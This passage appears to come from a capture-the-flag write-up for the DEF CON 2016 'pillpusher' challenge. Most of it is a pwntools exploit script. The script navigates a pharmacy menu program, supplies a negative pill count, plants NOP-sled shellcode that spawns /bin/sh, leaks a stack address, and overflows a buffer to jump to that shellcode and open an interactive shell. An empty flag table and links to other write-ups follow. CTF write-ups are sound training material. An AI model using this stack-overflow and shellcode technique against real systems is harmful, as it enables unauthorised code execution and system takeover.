    p.recvuntil('Patient name: ')
    p.sendline(patient)
    p.recvuntil('Would you like to enter symptoms? (Y/n): ')
    p.sendline('Y')
    p.recvuntil(': ')
    p.sendline('test')
    p.sendline('')
    p.recvuntil('-> ')
    p.sendline('5')
 
def AddScript(Pharmacy,Pharmacist,Patient,Pills):
    p.recvuntil('-> ')
    p.sendline('5')
 
    p.recvuntil('-> ')
    p.sendline('1')
    p.recvuntil(': ')
    p.sendline(Pharmacy)
 
    p.recvuntil('-> ')
    p.sendline('2')
    p.recvuntil(': ')
    p.sendline(Pharmacist)
 
    p.recvuntil('-> ')
    p.sendline('3')
    p.recvuntil(': ')
    p.sendline(Patient)
 
    p.recvuntil('-> ')
    p.sendline('4')
     
    p.recvuntil('How many pills to add: ')
    p.sendline('-1')
 
    for x in Pills:
        p.recvuntil(': ')
        p.sendline(x)
    p.recv()
    p.sendline('')
 
shellcode = asm(shellcraft.amd64.sh(),arch="amd64")
nop = '\x90' * (0x100 - len(shellcode))
pillname = nop + shellcode
 
AddaPill(pillname)
 
 
stackAddr = ListPills(pillname)
stackAddr += 0x130
print "Leak stack Addr : " + format(hex(stackAddr))
 
overflow = 'B' * 24 + p64(stackAddr)
 
nop = '\x90' * (250 - len(shellcode))
pillname = nop + shellcode
AddaPill(pillname)
AddaPill(overflow)
AddPharmacist("lazenca0x0")
CreatePharmacy("lazenca0x0",[overflow,pillname],"lazenca0x0")
AddPatient("test")
#sleep(20)
AddScript("lazenca0x0","1","test",[pillname,pillname,overflow])
p.recv()
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag |  |

## **Related Site**

* <https://github.com/CH1M4C/CTF_Writeup/tree/master/2016/Defcon/Pillpusher>
* <https://github.com/DaramG/ctf-writeup/blob/master/2016_defcon/pillpusher/solve.py>